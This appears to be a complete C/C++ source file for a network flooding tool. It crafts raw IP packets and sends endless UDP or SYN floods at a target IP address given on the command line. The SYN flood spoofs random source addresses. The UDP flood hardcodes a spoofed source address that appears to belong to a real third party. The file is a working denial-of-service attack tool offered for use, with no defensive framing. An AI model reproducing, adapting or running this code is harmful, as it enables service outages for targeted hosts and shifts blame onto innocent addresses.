
#include <iostream>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

using namespace std;


#define SEQ 0x28374839
#define getrandom(min, max) ((rand() % (int)(((max)+1) - (min))) + (min))

int udp_size=1024, udp_sport=12771, udp_dport=12769;
int syn_lowport=1, syn_highport=140, syn_sport=500;
int rawsock;
u_long myip = 2130706433;	/* 127.0.0.1 host byte ordered */
int nospoof = 0;

u_long
k00lip (void)
{
  struct in_addr hax0r;
  char convi[16];
  int a, b, c, d;

  hax0r.s_addr = htonl (myip);

  if (nospoof < 1)
    return (u_long) random ();

  srandom ((time (0) + random () % getpid ()));		/* supreme random leetness */

  sscanf (inet_ntoa (hax0r), "%d.%d.%d.%d", &a, &b, &c, &d);

  if (nospoof < 2)
    b = getrandom (1, 254);
  if (nospoof < 3)
    c = getrandom (1, 254);
  d = getrandom (1, 254);

  sprintf (convi, "%d.%d.%d.%d", a, b, c, d);

  return inet_addr (convi);
}

char *
k00lntoa (void)
{
  struct in_addr hax0r;
  hax0r.s_addr = k00lip ();
  return (inet_ntoa (hax0r));
}


struct udphdr {
  u_short uh_sport;               /* source port */
  u_short uh_dport;               /* destination port */
  short   uh_ulen;                /* udp length */
  u_short uh_sum;                 /* udp checksum */
};

unsigned short
ip_sum (u_short *addr, int len)
{
  register int nleft = len;
  register u_short *w = addr;
  register int sum = 0;
  u_short answer = 0;

  while (nleft > 1)
    {
      sum += *w++;
      nleft -= 2;
    }
  if (nleft == 1)
    {
      *(u_char *) (&answer) = *(u_char *) w;
      sum += answer;
    }
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  answer = ~sum;
  return (answer);
}


int 
udp(uint32_t victim)
{
  struct
  {
    struct ip iph;
    struct udphdr udph;
    char data[1024];
  } packet;

  struct sockaddr_in dest_addr;

  srandom ((time (NULL) + random ()));

  packet.iph.ip_hl = 5;
  packet.iph.ip_v = 4;
  packet.iph.ip_tos = 0x00;
  packet.iph.ip_len = htons (sizeof (struct ip) + sizeof(struct udphdr) + udp_size);
  packet.iph.ip_id = htons (random ());
  packet.iph.ip_off = 0;
  packet.iph.ip_ttl = 0xff;
  packet.iph.ip_p = IPPROTO_UDP;
  packet.iph.ip_src.s_addr = inet_addr("158.130.56.12");
  packet.iph.ip_dst.s_addr = victim;
  packet.iph.ip_sum = ip_sum ((u_short *)&packet.iph, sizeof (packet.iph));

  packet.udph.uh_sport = htons (udp_sport);
  packet.udph.uh_dport = htons (udp_dport);
  packet.udph.uh_ulen = htons (sizeof (packet.udph) + udp_size);

  dest_addr.sin_family = AF_INET;
  dest_addr.sin_addr.s_addr = victim;

  sendto (rawsock, (void*)&packet, (sizeof(struct ip)+sizeof(struct udphdr))+udp_size, 0, 
      (struct sockaddr*)&dest_addr, sizeof(dest_addr));

  return 1;
}


void 
send_tcp_segment(struct ip *ih, struct tcphdr *th, char *data, int dlen) 
{
  char buf[65536];
  struct {  // rfc 793 tcp pseudo-header
    unsigned long saddr, daddr;
    char mbz;
    char ptcl;
    unsigned short tcpl;
  } ph;

  struct sockaddr_in sin;

  ph.saddr=ih->ip_src.s_addr;
  ph.daddr=ih->ip_dst.s_addr;
  ph.mbz=0;
  ph.ptcl=IPPROTO_TCP;
  ph.tcpl=htons(sizeof(*th)+dlen);

  memcpy(buf, &ph, sizeof(ph));
  memcpy(buf+sizeof(ph), th, sizeof(*th));
  memcpy(buf+sizeof(ph)+sizeof(*th), data, dlen);
  memset(buf+sizeof(ph)+sizeof(*th)+dlen, 0, 4);
  th->check=ip_sum((u_short *)buf, (sizeof(ph)+sizeof(*th)+dlen+1)&~1);

  memcpy(buf, ih, 4*ih->ip_hl);
  memcpy(buf+4*ih->ip_hl, th, sizeof(*th));
  memcpy(buf+4*ih->ip_hl+sizeof(*th), data, dlen);
  memset(buf+4*ih->ip_hl+sizeof(*th)+dlen, 0, 4);
  ih->ip_sum=ip_sum((u_short *)buf, (4*ih->ip_hl + sizeof(*th)+ dlen + 1) & ~1);

  memcpy(buf, ih, 4*ih->ip_hl);

  sin.sin_family=AF_INET;
  sin.sin_port=th->dest;
  sin.sin_addr.s_addr=ih->ip_dst.s_addr;

  if(sendto(rawsock, buf, 4*ih->ip_hl + sizeof(*th)+ dlen, 0, (struct sockaddr *)&sin, sizeof(sin))<0) {
    std::cout << "Error sending syn packet.\n";
    exit(1);
  }
}


void syn (uint32_t victim, uint16_t port)
{
  int i, s;
  struct ip ih;
  struct tcphdr th;
  struct sockaddr_in sin;
  int sinsize;
  unsigned short myport=6969;
  char buf[1024];
  struct timeval tv;

  srandom(time(NULL) + random());
  ih.ip_v = 4;
  ih.ip_hl = 5;
  ih.ip_tos = 0;                  /* XXX is this normal? */
  ih.ip_len = sizeof(ih)+sizeof(th);
  ih.ip_id = htons(random());
  ih.ip_off = 0;
  ih.ip_ttl = 30;
  ih.ip_p = IPPROTO_TCP;
  ih.ip_sum = 0;
//  ih.ip_src.s_addr = inet_addr("127.0.0.1");
  ih.ip_src.s_addr = k00lip();
  ih.ip_dst.s_addr = victim;

  bzero(&th, sizeof(th));
  //th.source = htons(syn_sport);
  th.source = htons(getrandom (1, 4096) + 1000);

  th.dest = htons(port);
  th.seq = htonl(SEQ);
  th.ack_seq = htonl(random());
  th.doff = sizeof(th)/4;
  th.syn = 1;
  th.window = htons(65535);
  th.check = 0;
  th.urg_ptr = htons(random());

  send_tcp_segment(&ih, &th, buf, 0);
}


void
flood_udp(uint32_t ipaddr)
{
  int i, p;
  rawsock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  setsockopt(rawsock, IPPROTO_IP, IP_HDRINCL, "1", sizeof ("1"));
  while(1) 
  {
    udp(ipaddr);
    printf("send udp\n");
    usleep(100);
  }
}



void
flood_syn(uint32_t ipaddr)
{
  int port;

  port = syn_lowport;

  rawsock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
  setsockopt (rawsock, IPPROTO_IP, IP_HDRINCL, "1", sizeof ("1"));

  while(1) 
  {
    syn(ipaddr, 80);
    port++;
    if (port == syn_highport) port = syn_lowport; 
    usleep(300);
  }
}



int main(int argc, char** argv)
{

  if(argc < 2)
  {
    std::cout << "Program usage: ./flood type targetIP\n";
    std::cout << "Available type: udp syn\n";
    std::cout << "Note: you need to run as root user\n";
    exit(1);
  }

  if(strcmp(argv[1], "udp") == 0)
  {
    std::cout << "Flood " << argv[2] << " with udp traffic\n";
    uint32_t ipaddr = inet_addr(argv[2]);
    flood_udp(ipaddr);
  }
  else if(strcmp(argv[1], "syn") == 0)
  {
    std::cout << "Flood " << argv[2] << " with syn traffic\n";
    uint32_t ipaddr = inet_addr(argv[2]);
    flood_syn(ipaddr);
  }
  else
  {
    std::cout << "Program usage: ./flood type targetIP\n";
    std::cout << "Available type: udp syn\n";
    std::cout << "Note: you need to run as root user\n";
    exit(1);
  }

}




